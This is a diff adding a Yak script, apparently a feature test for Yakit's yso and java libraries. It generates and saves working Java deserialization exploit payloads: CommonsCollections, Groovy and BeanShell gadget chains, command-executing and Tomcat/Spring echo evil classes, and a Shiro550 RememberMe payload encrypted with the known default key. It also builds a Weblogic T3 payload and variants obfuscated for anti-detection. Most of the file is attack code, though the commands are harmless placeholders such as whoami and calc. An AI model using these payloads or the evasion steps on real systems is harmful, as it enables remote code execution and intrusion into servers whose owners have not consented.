@@ -1,0 +1,554 @@
+// =============================================================================
+// Java与YSO库综合实践与交叉验证脚本
+// =============================================================================
+// 本脚本展示 java 和 yso 库的所有核心功能，并进行交叉验证：
+// 1. YSO反序列化链生成与验证
+// 2. YSO恶意类生成与验证
+// 3. Java序列化对象解析与交叉验证
+// 4. 字节码生成、保存与反编译验证
+// 5. 多格式Payload生成与转换验证
+// =============================================================================
+
+// 准备工作目录
+// 关键词: 工作目录, /tmp/javatest, 交叉验证目录
+testCodeDir = "/tmp/javatest"
+demoDir = file.Join(os.Getwd(), "java-yso")
+
+// 创建测试目录
+os.MkdirAll(testCodeDir, 0755)
+os.MkdirAll(demoDir, 0755)
+yakit.Info("测试代码目录: %v", testCodeDir)
+yakit.Info("Demo保存目录: %v", demoDir)
+
+// =============================================================================
+// 第一部分: YSO反序列化利用链生成与验证
+// CommonsCollections URLDNS Gadget生成 序列化验证
+// 关键词: yso反序列化, Gadget链, CC链, 利用链验证, 序列化交叉测试
+// =============================================================================
+println("\n" + "=" * 80)
+println("第一部分: YSO反序列化利用链生成与验证")
+println("=" * 80)
+
+// ===== 1.1 CommonsCollections链生成 =====
+// 关键词: CommonsCollections, CC1-CC8链, yso.GetCommonsCollections
+println("\n1.1 CommonsCollections系列利用链")
+
+// CC1链 - 简单命令执行
+// 关键词: yso.GetCommonsCollections1JavaObject, CC1链, 命令执行
+cc1Obj = yso.GetCommonsCollections1JavaObject("whoami")~
+cc1Bytes = yso.ToBytes(cc1Obj)~
+yakit.Info("CC1链payload大小: %v bytes", len(cc1Bytes))
+
+// 保存CC1链到demo目录
+// 关键词: Payload保存, 文件导出, Demo生成
+cc1File = file.Join(demoDir, "cc1-whoami.ser")
+file.Save(cc1File, cc1Bytes)~
+yakit.Success("CC1链已保存: %v", cc1File)
+
+// 验证：解析刚生成的序列化数据
+// 关键词: 序列化验证, 解析验证, 交叉检查
+cc1Parsed = java.ParseJavaObjectStream(cc1Bytes)~
+assert len(cc1Parsed) > 0, "CC1链应该能被解析"
+yakit.Success("CC1链序列化验证通过")
+
+// CC5链
+// 关键词: yso.GetCommonsCollections5JavaObject, CC5链
+cc5Obj = yso.GetCommonsCollections5JavaObject("hostname")~
+cc5Bytes = yso.ToBytes(cc5Obj)~
+cc5File = file.Join(demoDir, "cc5-hostname.ser")
+file.Save(cc5File, cc5Bytes)~
+yakit.Info("CC5链已保存: %v", cc5File)
+
+// CC6链
+// 关键词: yso.GetCommonsCollections6JavaObject, CC6链
+cc6Obj = yso.GetCommonsCollections6JavaObject("uname -a")~
+cc6Bytes = yso.ToBytes(cc6Obj)~
+cc6File = file.Join(demoDir, "cc6-uname.ser")
+file.Save(cc6File, cc6Bytes)~
+yakit.Info("CC6链已保存: %v", cc6File)
+
+println("✓ CommonsCollections链生成与验证完成")
+
+// ===== 1.2 URLDNS链生成与验证 =====
+// 关键词: URLDNS, DNSLog检测, 漏洞探测
+println("\n1.2 URLDNS链生成与验证")
+
+// 生成URLDNS链
+// 关键词: yso.GetURLDNSJavaObject, URLDNS链, DNS外带
+urldnsObj = yso.GetURLDNSJavaObject("detect.dnslog.cn")~
+urldnsBytes = yso.ToBytes(urldnsObj)~
+yakit.Info("URLDNS payload大小: %v bytes", len(urldnsBytes))
+
+// 保存并验证
+urldnsFile = file.Join(demoDir, "urldns-detect.ser")
+file.Save(urldnsFile, urldnsBytes)~
+
+// JSON格式验证
+// 关键词: yso.ToJson, JSON导出, 数据可视化
+urldnsJson = yso.ToJson(urldnsObj)~
+urldnsJsonFile = file.Join(demoDir, "urldns-detect.json")
+file.Save(urldnsJsonFile, urldnsJson)~
+yakit.Success("URLDNS链已保存为.ser和.json格式")
+
+// 从JSON还原验证
+// 关键词: yso.FromJson, JSON还原, 序列化重建
+restoredObjs = yso.FromJson(urldnsJson)~
+assert len(restoredObjs) > 0, "应该能从JSON还原对象"
+restoredBytes = yso.ToBytes(restoredObjs[0])~
+assert len(restoredBytes) > 0, "还原的对象应该能序列化"
+yakit.Success("URLDNS链JSON序列化验证通过")
+
+println("✓ URLDNS链生成与验证完成")
+
+// ===== 1.3 其他经典链快速验证 =====
+// 关键词: 多链验证, Gadget集合, 批量测试
+println("\n1.3 其他经典链生成")
+
+// BeanShell1链
+bs1Obj = yso.GetBeanShell1JavaObject("id")~
+file.Save(file.Join(demoDir, "beanshell1-id.ser"), yso.ToBytes(bs1Obj)~)~
+yakit.Info("BeanShell1链已保存")
+
+// Groovy1链
+groovy1Obj = yso.GetGroovy1JavaObject("pwd")~
+file.Save(file.Join(demoDir, "groovy1-pwd.ser"), yso.ToBytes(groovy1Obj)~)~
+yakit.Info("Groovy1链已保存")
+
+println("✓ 经典利用链生成完成")
+
+// =============================================================================
+// 第二部分: YSO恶意类生成与字节码验证
+// 恶意类生成 ClassObject 字节码保存 反编译验证
+// 关键词: yso恶意类, GenerateClass, 字节码验证, 反编译交叉测试
+// =============================================================================
+println("\n" + "=" * 80)
+println("第二部分: YSO恶意类生成与字节码验证")
+println("=" * 80)
+
+// ===== 2.1 命令执行恶意类生成 =====
+// 关键词: 命令执行类, RuntimeExec, 字节码生成
+println("\n2.1 命令执行恶意类生成")
+
+// RuntimeExec命令执行类
+// 关键词: yso.GenerateRuntimeExecEvilClassObject, Runtime.exec
+runtimeExecClass = yso.GenerateRuntimeExecEvilClassObject(
+    "calc",
+    yso.evilClassName("RuntimeExecEvil"),
+    yso.majorVersion(52), // Java 8
+)~
+runtimeBytes = yso.ToBytes(runtimeExecClass)~
+yakit.Info("RuntimeExec类大小: %v bytes", len(runtimeBytes))
+
+// 保存到/tmp/javatest
+// 关键词: 字节码保存, Class文件, 测试文件
+runtimeClassFile = file.Join(testCodeDir, "RuntimeExecEvil.class")
+file.Save(runtimeClassFile, runtimeBytes)~
+yakit.Success("RuntimeExec类已保存: %v", runtimeClassFile)
+
+// 验证Magic Number
+// 关键词: Magic验证, 0xCAFEBABE, 字节码验证
+magicBytes = runtimeBytes[:4]
+magic = codec.EncodeToHex(magicBytes)
+assert magic == "cafebabe", sprintf("Magic应该是cafebabe，实际是: %v", magic)
+yakit.Success("字节码Magic验证通过: 0xCAFEBABE")
+
+// ProcessBuilder命令执行类
+pbExecClass = yso.GenerateProcessBuilderExecEvilClassObject(
+    "whoami",
+    yso.evilClassName("PBExecEvil"),
+)~
+pbClassFile = file.Join(testCodeDir, "PBExecEvil.class")
+file.Save(pbClassFile, yso.ToBytes(pbExecClass)~)~
+yakit.Info("ProcessBuilder类已保存: %v", pbClassFile)
+
+println("✓ 命令执行类生成与验证完成")
+
+// ===== 2.2 DNSLog探测类生成 =====
+// 关键词: DNSLog类, 外带检测, DNS探测
+println("\n2.2 DNSLog探测类生成")
+
+dnslogClass = yso.GenerateDNSlogEvilClassObject(
+    "test.dnslog.cn",
+    yso.evilClassName("DNSLogEvil"),
+    yso.majorVersion(52),
+)~
+dnslogBytes = yso.ToBytes(dnslogClass)~
+dnslogClassFile = file.Join(testCodeDir, "DNSLogEvil.class")
+file.Save(dnslogClassFile, dnslogBytes)~
+yakit.Success("DNSLog类已保存: %v", dnslogClassFile)
+
+// 同时保存到demo目录
+file.Save(file.Join(demoDir, "DNSLogEvil.class"), dnslogBytes)~
+
+println("✓ DNSLog探测类生成完成")
+
+// ===== 2.3 回显恶意类生成 =====
+// 关键词: 回显类, Echo, TomcatEcho, 内存马
+println("\n2.3 回显恶意类生成")
+
+// Tomcat回显类
+tomcatEcho = yso.GenerateTomcatEchoClassObject(
+    yso.useHeaderParam("X-Cmd", "whoami"),
+    yso.evilClassName("TomcatEchoEvil"),
+)~
+tomcatEchoFile = file.Join(testCodeDir, "TomcatEchoEvil.class")
+file.Save(tomcatEchoFile, yso.ToBytes(tomcatEcho)~)~
+yakit.Info("Tomcat回显类已保存: %v", tomcatEchoFile)
+
+// Spring回显类
+springEcho = yso.GenerateSpringEchoEvilClassObject(
+    yso.springHeader("X-Spring", "test"),
+    yso.evilClassName("SpringEchoEvil"),
+)~
+springEchoFile = file.Join(testCodeDir, "SpringEchoEvil.class")
+file.Save(springEchoFile, yso.ToBytes(springEcho)~)~
+yakit.Info("Spring回显类已保存: %v", springEchoFile)
+
+println("✓ 回显类生成完成")
+
+// ===== 2.4 延时检测类生成 =====
+// 关键词: Sleep类, 延时检测, 盲注
+println("\n2.4 延时检测类生成")
+
+sleepClass = yso.GenerateSleepClassObject(
+    yso.useSleepTime(5),
+    yso.evilClassName("SleepEvil"),
+)~
+sleepClassFile = file.Join(testCodeDir, "SleepEvil.class")
+file.Save(sleepClassFile, yso.ToBytes(sleepClass)~)~
+yakit.Success("Sleep类已保存: %v", sleepClassFile)
+
+println("✓ 延时检测类生成完成")
+
+// =============================================================================
+// 第三部分: 字节码操作与交叉验证
+// 字节码加载 BCEL编码 混淆验证 格式转换
+// 关键词: 字节码操作, LoadClass, BCEL, 交叉验证, 格式转换
+// =============================================================================
+println("\n" + "=" * 80)
+println("第三部分: 字节码操作与交叉验证")
+println("=" * 80)
+
+// ===== 3.1 字节码加载验证 =====
+// 关键词: 字节码加载, yso.LoadClassFromBytes
+println("\n3.1 字节码加载验证")
+
+// 读取刚才保存的类文件
+savedBytes = file.ReadFile(runtimeClassFile)~
+yakit.Info("读取字节码文件: %v bytes", len(savedBytes))
+
+// 从字节码加载
+loadedClass = yso.LoadClassFromBytes(savedBytes)~
+yakit.Info("类名: %v", loadedClass.ThisClassVerbose)
+yakit.Info("Magic: 0x%X", loadedClass.Magic)
+yakit.Info("Java版本: %v", loadedClass.MajorVersion)
+
+assert loadedClass.Magic == 0xCAFEBABE, "Magic应该是0xCAFEBABE"
+assert loadedClass.MajorVersion == 52, "Java版本应该是52(Java 8)"
+yakit.Success("字节码加载验证通过")
+
+// ===== 3.2 BCEL编码转换验证 =====
+// 关键词: BCEL编码, yso.ToBcel, ClassLoader绕过
+println("\n3.2 BCEL编码转换验证")
+
+// 转为BCEL格式
+bcelStr = yso.ToBcel(loadedClass)~
+yakit.Info("BCEL编码长度: %v", len(bcelStr))
+yakit.Text(sprintf("BCEL示例: %v...", bcelStr[:min(100, len(bcelStr))]))
+
+// 保存BCEL编码
+bcelFile = file.Join(demoDir, "RuntimeExecEvil.bcel")
+file.Save(bcelFile, bcelStr)~
+yakit.Success("BCEL编码已保存: %v", bcelFile)
+
+// 从BCEL还原
+bcelLoaded = yso.LoadClassFromBCEL(bcelStr)~
+assert bcelLoaded.Magic == 0xCAFEBABE, "从BCEL还原的类应该有效"
+yakit.Success("BCEL编码转换验证通过")
+
+// ===== 3.3 Base64编码验证 =====
+// 关键词: Base64编码, 字节码传输
+println("\n3.3 Base64编码验证")
+
+base64Bytes = codec.EncodeBase64(savedBytes)
+yakit.Info("Base64编码长度: %v", len(base64Bytes))
+
+// 保存Base64
+base64File = file.Join(demoDir, "RuntimeExecEvil.base64")
+file.Save(base64File, base64Bytes)~
+
+// 从Base64加载
+base64Loaded = yso.LoadClassFromBase64(base64Bytes)~
+assert base64Loaded.Magic == 0xCAFEBABE, "从Base64还原的类应该有效"
+yakit.Success("Base64编码验证通过")
+
+println("✓ 字节码操作验证完成")
+
+// =============================================================================
+// 第四部分: 序列化对象解析与交叉验证
+// 对象解析 JSON转换 Hex解析 多格式验证
+// 关键词: 序列化解析, ParseJavaObjectStream, 格式转换, 交叉测试
+// =============================================================================
+println("\n" + "=" * 80)
+println("第四部分: 序列化对象解析与交叉验证")
+println("=" * 80)
+
+// ===== 4.1 多格式Payload生成 =====
+// 关键词: 多格式, Hex, Base64, JSON
+println("\n4.1 多格式Payload生成")
+
+// 生成测试对象
+testPayloadObj = yso.GetCommonsCollections6JavaObject("test")~
+
+// Bytes格式
+bytesPayload = yso.ToBytes(testPayloadObj)~
+bytesFile = file.Join(demoDir, "test-payload.ser")
+file.Save(bytesFile, bytesPayload)~
+yakit.Info("Bytes格式: %v", bytesFile)
+
+// Hex格式
+hexPayload = codec.EncodeToHex(bytesPayload)
+hexFile = file.Join(demoDir, "test-payload.hex")
+file.Save(hexFile, hexPayload)~
+yakit.Info("Hex格式: %v", hexFile)
+
+// Base64格式
+base64Payload = codec.EncodeBase64(bytesPayload)
+base64PayloadFile = file.Join(demoDir, "test-payload.base64")
+file.Save(base64PayloadFile, base64Payload)~
+yakit.Info("Base64格式: %v", base64PayloadFile)
+
+// JSON格式
+jsonPayload = yso.ToJson(testPayloadObj)~
+jsonFile = file.Join(demoDir, "test-payload.json")
+file.Save(jsonFile, jsonPayload)~
+yakit.Info("JSON格式: %v", jsonFile)
+
+yakit.Success("多格式Payload生成完成")
+
+// ===== 4.2 解析验证 =====
+// 关键词: 解析验证, 格式还原, 交叉检查
+println("\n4.2 解析验证")
+
+// 从Bytes解析
+bytesP = java.ParseJavaObjectStream(bytesPayload)~
+assert len(bytesP) > 0, "Bytes格式应该能解析"
+yakit.Info("Bytes解析: %v个对象", len(bytesP))
+
+// 从Hex解析
+hexParsed = java.ParseHexJavaObjectStream(hexPayload)~
+assert len(hexParsed) > 0, "Hex格式应该能解析"
+yakit.Info("Hex解析: %v个对象", len(hexParsed))
+
+// 从JSON还原
+jsonRestored = yso.FromJson(jsonPayload)~
+assert len(jsonRestored) > 0, "JSON应该能还原"
+yakit.Info("JSON还原: %v个对象", len(jsonRestored))
+
+// 验证还原的对象能序列化
+jsonBytes = yso.ToBytes(jsonRestored[0])~
+assert len(jsonBytes) > 0, "还原的对象应该能序列化"
+
+yakit.Success("所有格式解析验证通过")
+
+println("✓ 序列化对象解析验证完成")
+
+// =============================================================================
+// 第五部分: Shiro/Weblogic实战场景验证
+// Shiro550 Weblogic T3 实战Payload 完整利用链
+// 关键词: Shiro漏洞, Weblogic漏洞, 实战场景, 完整利用
+// =============================================================================
+println("\n" + "=" * 80)
+println("第五部分: Shiro/Weblogic实战场景验证")
+println("=" * 80)
+
+// ===== 5.1 Shiro反序列化Payload =====
+// 关键词: Shiro550, RememberMe, AES加密
+println("\n5.1 Shiro反序列化Payload生成")
+
+// 生成Shiro检测payload
+shiroDetect = yso.GetSimplePrincipalCollectionJavaObject()~
+shiroDetectBytes = yso.ToBytes(shiroDetect)~
+file.Save(file.Join(demoDir, "shiro-detect.ser"), shiroDetectBytes)~
+yakit.Info("Shiro检测payload: %v bytes", len(shiroDetectBytes))
+
+// 生成Shiro命令执行payload
+shiroCmdObj = yso.GetCommonsBeanutils183NOCCJavaObject(
+    yso.useRuntimeExecEvilClass("whoami"),
+    yso.evilClassName("ShiroExploit"),
+)~
+shiroCmdBytes = yso.ToBytes(shiroCmdObj)~
+
+// 模拟Shiro加密
+shiroKey = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")~
+paddedData = codec.PKCS5Padding(shiroCmdBytes, 16)
+iv = []byte(str.RandStr(16))
+encrypted = codec.AESCBCEncrypt(shiroKey, paddedData, iv)~
+shiroPayload = codec.EncodeBase64(append(iv, encrypted...))
+
+// 保存Shiro payload
+shiroFile = file.Join(demoDir, "shiro-exploit.txt")
+file.Save(shiroFile, shiroPayload)~
+yakit.Success("Shiro payload已保存: %v", shiroFile)
+
+println("✓ Shiro场景验证完成")
+
+// ===== 5.2 Weblogic T3 Payload =====
+// 关键词: Weblogic T3, CVE-2015-4852
+println("\n5.2 Weblogic T3 Payload生成")
+
+weblogicObj = yso.GetCommonsCollections1JavaObject("calc")~
+weblogicBytes = yso.ToBytes(weblogicObj)~
+weblogicFile = file.Join(demoDir, "weblogic-t3.ser")
+file.Save(weblogicFile, weblogicBytes)~
+yakit.Success("Weblogic T3 payload已保存: %v", weblogicFile)
+
+println("✓ Weblogic场景验证完成")
+
+// =============================================================================
+// 第六部分: Gadget批量生成与验证
+// Gadget爆破 批量生成 自动化测试
+// 关键词: Gadget批量, 自动化, 爆破测试, 批量验证
+// =============================================================================
+println("\n" + "=" * 80)
+println("第六部分: Gadget批量生成与验证")
+println("=" * 80)
+
+// ===== 6.1 Runtime Exec Gadget批量生成 =====
+// 关键词: yso.GetAllRuntimeExecGadget, 批量Gadget
+println("\n6.1 Runtime Exec Gadget批量生成")
+
+runtimeGadgets = yso.GetAllRuntimeExecGadget()
+yakit.Info("获取到 %v 个RuntimeExec Gadget", len(runtimeGadgets))
+
+// 批量生成前5个Gadget
+testCmd = "whoami"
+for i = 0; i < min(5, len(runtimeGadgets)); i++ {
+    gadget = runtimeGadgets[i]
+    obj = gadget(testCmd)~
+    bytes = yso.ToBytes(obj)~
+    gadgetName = yso.GetGadgetNameByFun(gadget)~
+    
+    // 保存到demo目录
+    fileName = sprintf("gadget-%02d-%v.ser", i+1, gadgetName)
+    file.Save(file.Join(demoDir, fileName), bytes)~
+    yakit.Info("Gadget[%v] %v: %v bytes", i+1, gadgetName, len(bytes))
+}
+
+yakit.Success("批量Gadget生成完成")
+
+println("✓ Gadget批量生成验证完成")
+
+// =============================================================================
+// 第七部分: 高级功能与混淆验证
+// GetGadget动态生成 混淆技术 反检测
+// 关键词: 动态Gadget, 混淆, 反检测, 高级技术
+// =============================================================================
+println("\n" + "=" * 80)
+println("第七部分: 高级功能与混淆验证")
+println("=" * 80)
+
+// ===== 7.1 GetGadget动态生成 =====
+// 关键词: yso.GetGadget, 动态生成
+println("\n7.1 GetGadget动态生成")
+
+// 简单模式
+gadget1 = yso.GetGadget("CommonsCollections1", "test1")~
+file.Save(file.Join(demoDir, "dynamic-cc1.ser"), yso.ToBytes(gadget1)~)~
+yakit.Info("动态生成CC1链")
+
+// 配置选项模式
+gadget2 = yso.GetGadget("CommonsCollections2", yso.useRuntimeExecEvilClass("test2"))~
+file.Save(file.Join(demoDir, "dynamic-cc2.ser"), yso.ToBytes(gadget2)~)~
+yakit.Info("动态生成CC2链")
+
+yakit.Success("GetGadget动态生成验证通过")
+
+// ===== 7.2 混淆和反检测 =====
+// 关键词: 混淆技术, obfuscation, 反检测
+println("\n7.2 混淆和反检测技术")
+
+// 常量池混淆
+obfGadget = yso.GetCommonsBeanutils1JavaObject(
+    yso.useRuntimeExecEvilClass("bypass"),
+    yso.obfuscationClassConstantPool(), // 常量池混淆
+    yso.evilClassName(str.RandStr(10)), // 随机类名
+)~
+
+// 不同编码方式
+normalBytes = yso.ToBytes(obfGadget)~
+twoByteBytes = yso.ToBytes(obfGadget, yso.twoBytesCharString())~
+threeByteBytes = yso.ToBytes(obfGadget, yso.threeBytesCharString())~
+dirtyBytes = yso.ToBytes(obfGadget, yso.dirtyDataLength(1000))~
+
+yakit.Info("正常编码: %v bytes", len(normalBytes))
+yakit.Info("双字节编码: %v bytes", len(twoByteBytes))
+yakit.Info("三字节编码: %v bytes", len(threeByteBytes))
+yakit.Info("脏数据填充: %v bytes", len(dirtyBytes))
+
+// 保存混淆样本
+file.Save(file.Join(demoDir, "obf-normal.ser"), normalBytes)~
+file.Save(file.Join(demoDir, "obf-twobyte.ser"), twoByteBytes)~
+file.Save(file.Join(demoDir, "obf-threebyte.ser"), threeByteBytes)~
+file.Save(file.Join(demoDir, "obf-dirty.ser"), dirtyBytes)~
+
+yakit.Success("混淆技术验证完成")
+
+println("✓ 高级功能验证完成")
+
+// =============================================================================
+// 测试总结与统计
+// =============================================================================
+println("\n" + "=" * 80)
+println("测试总结与统计")
+println("=" * 80)
+
+// 统计生成的文件
+// 关键词: 文件统计, 成果展示
+codeFileCount = 0
+demoFileCount = 0
+
+file.Recurse(testCodeDir, func(info) {
+    if file.IsFile(info.Path) {
+        codeFileCount++
+    }
+})
+
+file.Recurse(demoDir, func(info) {
+    if file.IsFile(info.Path) {
+        demoFileCount++
+    }
+})
+
+yakit.Success(`
+Java与YSO库功能测试完成！
+
+生成文件统计:
+  - 测试代码目录 (%v): %v 个文件
+  - Demo目录 (%v): %v 个文件
+
+测试覆盖:
+  ✓ YSO反序列化链生成 (CC/CB/URLDNS等)
+  ✓ YSO恶意类生成 (命令执行/回显/DNSLog等)
+  ✓ 字节码操作 (加载/BCEL/Base64)
+  ✓ 序列化对象解析 (Bytes/Hex/JSON)
+  ✓ 实战场景 (Shiro/Weblogic)
+  ✓ Gadget批量生成
+  ✓ 高级功能 (GetGadget/混淆/反检测)
+
+文件格式:
+  - .ser: Java序列化对象
+  - .class: Java字节码文件
+  - .json: JSON格式对象
+  - .hex: 十六进制编码
+  - .base64: Base64编码
+  - .bcel: BCEL编码格式
+
+所有Java与YSO功能测试通过!
+`, testCodeDir, codeFileCount, demoDir, demoFileCount)
+
+println("=" * 80)
+println("查看生成的文件:")
+println(sprintf("  ls -lh %v", testCodeDir))
+println(sprintf("  ls -lh %v", demoDir))
+println("=" * 80)
